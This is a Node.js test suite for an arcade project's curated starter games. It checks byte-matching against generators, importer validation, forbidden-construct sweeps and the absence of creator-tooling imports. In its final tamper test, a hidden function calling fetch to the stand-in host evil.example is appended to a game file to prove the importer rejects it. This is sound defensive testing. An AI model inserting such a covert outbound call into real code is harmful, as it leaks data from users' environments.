// ADR-043 — curated starter STATICS: byte-pinned to their generators, importer-proven,
// forbidden-construct-swept, and free of any production import of arcade/creator/**.
// Run: node --test tests/creator/curated-starter-files.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

import { CURATED_STARTERS, starterManifest, validateCuratedFloor } from '../../arcade/cabinets/starters/curated-floor.mjs';
import { starterAdapter, starterContract } from '../../arcade/cabinets/starters/starter-host.mjs';
import { buildStarterPackage, STARTERS } from '../../arcade/creator/arcade-builder/cabinet-templates.mjs';
import { floorAdapterSource } from '../../arcade/creator/arcade-builder/write-starter-statics.mjs';
import { importArcadePackage, SOURCE_FORBIDDEN } from '../../arcade/creator/arcade-importer/import-arcade-package.mjs';
import { FORBIDDEN_TERMS_RE } from '../../arcade/creator/validator/validation-report.mjs';
import { validateManifest } from '../../arcade/game-import-manifest.mjs';
import { validateAdapter } from '../../arcade/cabinet-adapter-sdk.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const onDisk = (entry, file) => readFileSync(join(ROOT, 'arcade', 'cabinets', 'starters', entry.starter_id, file), 'utf8');

test('the curated floor list itself validates (the floor renders nothing otherwise)', () => {
  const v = validateCuratedFloor(CURATED_STARTERS);
  assert.deepEqual(v.errors, []);
  assert.equal(v.ok, true);
  assert.ok(CURATED_STARTERS.length >= 6 && CURATED_STARTERS.length <= 8);
});

test('BYTE-MATCH: every checked-in game.mjs equals its closed-table regeneration', () => {
  for (const e of CURATED_STARTERS) {
    const pkg = buildStarterPackage(e.starter_id);
    assert.ok(pkg, `${e.starter_id} exists in the starter library`);
    assert.equal(onDisk(e, 'game.mjs'), pkg.files['game.mjs'] + '\n', `${e.starter_id}/game.mjs drifted from the generator`);
  }
});

test('BYTE-MATCH: every checked-in adapter.mjs equals the writer template', () => {
  for (const e of CURATED_STARTERS) {
    assert.equal(onDisk(e, 'adapter.mjs'), floorAdapterSource(e), `${e.starter_id}/adapter.mjs drifted from the template`);
  }
});

test('on-disk bytes independently pass the CF-4 importer gate (not just the regeneration)', () => {
  for (const e of CURATED_STARTERS) {
    const lib = STARTERS.find((s) => s.id === e.starter_id);
    const manifest = buildStarterPackage(e.starter_id).manifest;
    const report = importArcadePackage({
      manifest,
      files: { 'game.mjs': onDisk(e, 'game.mjs').replace(/\n$/, ''), 'adapter.mjs': buildStarterPackage(e.starter_id).files['adapter.mjs'] },
    });
    assert.ok(report.ok, `${e.starter_id}: ${report.errors.join(' | ')}`);
    assert.ok(lib, `${e.starter_id} is a real library starter`);
  }
});

test('SOURCE_FORBIDDEN + economy sweep over every checked-in static', () => {
  for (const e of CURATED_STARTERS) {
    for (const f of ['game.mjs', 'adapter.mjs']) {
      const src = onDisk(e, f);
      for (const [label, re] of SOURCE_FORBIDDEN) assert.ok(!re.test(src), `${e.starter_id}/${f}: ${label}`);
      assert.ok(!FORBIDDEN_TERMS_RE.test(src), `${e.starter_id}/${f}: economy vocabulary`);
    }
  }
});

test('NO production file under arcade/cabinets/ imports arcade/creator/** (deploy-hazard guard)', () => {
  const walk = (dir) => readdirSync(join(ROOT, dir), { withFileTypes: true }).flatMap((d) =>
    d.isDirectory() ? walk(`${dir}/${d.name}`) : (/\.(mjs|js)$/.test(d.name) ? [`${dir}/${d.name}`] : []));
  // comments may HONESTLY discuss the creator pipeline; only real import statements are the hazard
  const IMPORT_RE = /(?:from\s+|import\s*\(\s*)['"][^'"]*creator[^'"]*['"]/;
  for (const f of walk('arcade/cabinets')) {
    assert.ok(!IMPORT_RE.test(readFileSync(join(ROOT, f), 'utf8')), `${f} imports creator tooling`);
  }
});

test('curated copy stays in sync with the starter library (anti-drift for the duplicated strings)', () => {
  for (const e of CURATED_STARTERS) {
    const lib = STARTERS.find((s) => s.id === e.starter_id);
    assert.equal(e.label, lib.name, `${e.starter_id} label`);
    assert.equal(e.pitch, lib.pitch, `${e.starter_id} pitch`);
  }
});

test('import-loader manifests validate; adapters validate against their contracts; strictly local-only', () => {
  for (const e of CURATED_STARTERS) {
    const m = starterManifest(e);
    const mv = validateManifest(m);
    assert.deepEqual(mv.errors, [], e.starter_id);
    assert.equal(m.ticket_mode, 'none');
    assert.equal(m.authority_mode, 'client_local_only');
    const adapter = starterAdapter(e.game_id, e.label);
    const contract = starterContract(e.game_id, e.label);
    const av = validateAdapter(adapter, { getContract: (id) => (id === e.game_id ? contract : null) });
    assert.deepEqual(av.errors, [], e.starter_id);
    assert.equal(adapter.capabilities.tickets, false);
  }
});

test('TAMPER: a mutated checked-in game fails the importer AND the byte-match', () => {
  const e = CURATED_STARTERS[0];
  const tampered = onDisk(e, 'game.mjs') + '\nfunction _leak(){ fetch("https://evil.example/x"); }';
  const report = importArcadePackage({ manifest: buildStarterPackage(e.starter_id).manifest, files: { 'game.mjs': tampered, 'adapter.mjs': buildStarterPackage(e.starter_id).files['adapter.mjs'] } });
  assert.equal(report.ok, false);
  assert.ok(report.errors.some((x) => /fetch/.test(x)));
  assert.notEqual(tampered, buildStarterPackage(e.starter_id).files['game.mjs'] + '\n');
});
